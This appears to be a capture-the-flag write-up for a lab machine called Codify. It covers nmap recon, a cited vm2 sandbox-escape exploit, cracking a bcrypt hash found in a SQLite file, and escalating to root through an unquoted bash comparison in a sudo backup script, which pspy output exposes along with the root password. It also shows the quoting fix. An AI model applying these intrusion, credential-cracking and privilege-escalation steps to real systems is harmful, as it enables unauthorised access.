
### Initial access
Nmap
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

We see port 80.3000 dectect framework


![[Assets/Pasted image 20260909090717.png]]

This could be   OS command injection and  after research in found https://www.exploit-db.com/exploits/51898 the cve base on vm2 lib.
 We get revshell and continue recon
 ```
 svc@codify:~/.cache$ id       id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~/.cache$ 



 ```

### Lateral Movement
Run linpeas
```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100) (T1005)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 836, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/plocate/plocate.db: regular file, no read permission
Found /var/www/contact/tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                              
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                                                                                                    
 -> Extracting tables from /var/www/contact/tickets.db (limit 20)     
```
We see joshua cred
```
cat /var/www/contact/tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��  tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own compr]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:~$ 
```
Let crack it
```
┌──(kali㉿kali)-[~/HTB/Codify]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:00:13 DONE (2026-09-08 22:47) 0.07225g/s 98.84p/s 98.84c/s 98.84C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Codify]
└─$ cat hash      
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

```

Switch user
```bash
joshua@codify:~$ cat user.txt           cat user.txt
cat user.txt
b3f73e72c050a499b6c662f5f4a7b0cc
joshua@codify:~$ 


joshua@codify:~$ sudo -l                   sudo -l
sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```

### Priv escalation
Read the sudo scripts
```
joshua@codify:~$ cat /opt/scripts/mysql-cat /opt/scripts/mysql-backup.sh

cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done


```
Run pspy
```bash
joshua@codify:~$ wget -O pspy64 http://10.1wget -O pspy64 http://10.10.17.47/pspy64
wget -O pspy64 http://10.10.17.47/pspy64
--2026-09-09 03:10:10--  http://10.10.17.47/pspy64
Connecting to 10.10.17.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  3.78MB/s    in 0.8s    

2026-09-09 03:10:12 (3.78 MB/s) - ‘pspy64’ saved [3078592/3078592]

joshua@codify:~$ chmod +x pspy64        chmod +x pspy64
chmod +x pspy64
joshua@codify:~$ .\pspy64               .\pspy64
.\pspy64
.pspy64: command not found
joshua@codify:~$ ls                     ls
ls
pspy64  user.txt
joshua@codify:~$ ./pspy64               ./pspy64
./pspy64

```
Aanlyze sink point
```
if [[ $DB_PASS == $USER_PASS ]]
```
 If we use `*` the wildcard , the logic will become matching regex logic, to secure the code we need but our var to `""` to keep string data type.
Fix code
```
if [[ "$DB_PASS" == "$USER_PASS" ]]
```
Pspy see the pass word of root
```bash
2026/09/09 03:18:53 CMD: UID=0    PID=120310 | /bin/bash /opt/scripts/mysql-backup.sh 
2026/09/09 03:18:53 CMD: UID=0    PID=120312 | /usr/bin/grep -Ev (Database|information_schema|performance_schema) 
2026/09/09 03:18:53 CMD: UID=0    PID=120311 | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
2026/09/09 03:18:53 CMD: UID=0    PID=120316 | /usr/bin/gzip
```
Copy fail 
```
joshua@codify:~$ python exp.py 
Command 'python' not found, did you mean:
  command 'python3' from deb python3
  command 'python' from deb python-is-python3
joshua@codify:~$ python3 exp.py 
# id
uid=0(root) gid=1000(joshua) groups=1000(joshua)
```

So we have 2 way to get root and learn about secure script in she bang.